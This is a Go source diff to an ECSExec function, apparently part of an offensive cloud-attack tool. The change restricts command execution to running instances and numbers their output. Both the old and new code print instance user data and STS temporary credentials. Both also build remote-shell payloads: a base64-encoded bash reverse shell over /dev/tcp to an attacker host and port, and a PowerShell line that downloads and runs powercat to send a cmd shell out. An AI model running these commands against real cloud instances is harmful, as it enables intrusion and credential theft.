@@ -162,54 +162,63 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 				}
 			}
 		}
+		var num = 0
 		for _, i := range InstancesList {
-			region := i.RegionId
-			OSType := i.OSType
 			specifiedInstanceID := i.InstanceId
-			if userData == true {
-				commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
-				if commandResult == "" {
-					fmt.Println("未找到用户数据 (User data not found)")
-				} else if commandResult == "disabled" {
-					fmt.Println("该实例禁止访问用户数据 (This instance disables access to user data)")
+			if i.Status == "Running" {
+				num = num + 1
+				InstanceName := i.InstanceName
+				region := i.RegionId
+				OSType := i.OSType
+				if userData == true {
+					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
+					if commandResult == "" {
+						fmt.Println("未找到用户数据 (User data not found)")
+					} else if commandResult == "disabled" {
+						fmt.Println("该实例禁止访问用户数据 (This instance disables access to user data)")
+					} else {
+						fmt.Println(commandResult)
+					}
+				} else if metaDataSTSToken == true {
+					commandResult := getMetaDataSTSToken(region, OSType, scriptType, specifiedInstanceID, timeOut)
+					if commandResult == "" {
+						fmt.Println("未找到临时访问凭证 (STS Token not found)")
+					} else if commandResult == "disabled" {
+						fmt.Println("该实例禁止访问临时凭证 (This instance disables access to STS Token)")
+					} else {
+						fmt.Println(commandResult)
+					}
 				} else {
+					if batchCommand == true {
+						if OSType == "linux" {
+							command = "whoami && id && hostname && ifconfig"
+						} else {
+							command = "whoami && hostname && ipconfig"
+						}
+					} else if lhost != "" {
+						if OSType == "linux" {
+							revShell := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
+							command = fmt.Sprintf("bash -c '{echo,%s}|{base64,-d}|{bash,-i}'", base64.StdEncoding.EncodeToString([]byte(revShell)))
+						} else {
+							command = fmt.Sprintf("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd", lhost, lport)
+						}
+					} else if commandFile != "" {
+						file, err := os.Open(commandFile)
+						util.HandleErr(err)
+						defer file.Close()
+						contentByte, err := ioutil.ReadAll(file)
+						util.HandleErr(err)
+						content := string(contentByte)
+						command = content[:len(content)-1]
+					}
+					if len(InstancesList) == 1 {
+						color.Printf("\n<lightGreen>%s (%s) ></> %s\n\n", specifiedInstanceID, InstanceName, command)
+					} else {
+						color.Printf("\n<lightGreen>%d %s (%s) ></> %s\n\n", num, specifiedInstanceID, InstanceName, command)
+					}
+					commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
 					fmt.Println(commandResult)
 				}
-			} else if metaDataSTSToken == true {
-				commandResult := getMetaDataSTSToken(region, OSType, scriptType, specifiedInstanceID, timeOut)
-				if commandResult == "" {
-					fmt.Println("未找到临时访问凭证 (STS Token not found)")
-				} else if commandResult == "disabled" {
-					fmt.Println("该实例禁止访问临时凭证 (This instance disables access to STS Token)")
-				} else {
-					fmt.Println(commandResult)
-				}
-			} else {
-				if batchCommand == true {
-					if OSType == "linux" {
-						command = "whoami && id && hostname && ifconfig"
-					} else {
-						command = "whoami && hostname && ipconfig"
-					}
-				} else if lhost != "" {
-					if OSType == "linux" {
-						revShell := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
-						command = fmt.Sprintf("bash -c '{echo,%s}|{base64,-d}|{bash,-i}'", base64.StdEncoding.EncodeToString([]byte(revShell)))
-					} else {
-						command = fmt.Sprintf("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd", lhost, lport)
-					}
-				} else if commandFile != "" {
-					file, err := os.Open(commandFile)
-					util.HandleErr(err)
-					defer file.Close()
-					contentByte, err := ioutil.ReadAll(file)
-					util.HandleErr(err)
-					content := string(contentByte)
-					command = content[:len(content)-1]
-				}
-				color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
-				commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
-				fmt.Println(commandResult)
 			}
 		}
 	}
